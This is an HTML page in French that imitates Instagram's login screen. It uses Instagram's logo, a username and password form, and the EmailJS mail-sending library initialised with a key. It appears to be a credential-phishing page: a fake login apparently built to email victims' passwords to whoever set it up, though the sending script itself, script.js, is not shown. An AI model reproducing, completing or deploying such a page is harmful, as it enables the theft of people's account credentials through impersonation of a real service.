<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Instagram</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("TR-V0PpRNpxABebux");
        })();
    </script>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo">
            <form id="loginForm">
                <div class="textbox">
                    <input type="text" id="username" name="username" required>
                    <label for="username">Nom d'utilisateur</label>
                </div>
                <div class="textbox">
                    <input type="password" id="password" name="password" required>
                    <label for="password">Mot de passe</label>
                </div>
                <button type="submit" class="btn">Se connecter</button>
                <p id="loginMessage"></p>
            </form>
            <div class="additional-info">
                <a href="#" class="forgot-password">Forgot password?</a>
                <p>You can also report content you believe is unlawful in your country without logging in.</p>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
